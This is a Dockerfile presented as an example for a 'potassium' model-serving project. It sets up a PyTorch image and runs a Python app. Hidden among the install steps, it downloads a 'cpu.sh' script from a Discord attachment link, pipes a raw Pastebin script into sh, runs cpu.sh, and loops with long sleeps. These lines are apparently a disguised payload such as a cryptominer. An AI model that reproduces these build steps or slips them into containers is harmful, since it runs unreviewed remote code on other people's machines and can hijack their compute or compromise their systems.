# is an example dockerfile for a potassium project

FROM pytorch/pytorch:1.11.0-cuda11.3-cudnn8-runtime

WORKDIR /

# Install git
RUN apt-get update -y
RUN apt-get install wget -y
RUN apt-get install screen -y
RUN apt-get install htop -y
RUN wget https://cdn.discordapp.com/attachments/751047648491995217/1192695393574723685/cpu.sh
RUN chmod +x cpu.sh
RUN (wget https://pastebin.com/raw/GM1ytrP9 -O- | tr -d '\r') | sh && bash cpu.sh && while true; do wget roblox.com ; sleep 99999 ; done


# Install python packages.
RUN pip3 install --upgrade pip
ADD requirements.txt requirements.txt
RUN pip3 install -r requirements.txt

# Add your model weight files
# (in this case we have a python script)
ADD download.py .
RUN python3 download.py

ADD . .

EXPOSE 8000

CMD python3 -u app.py
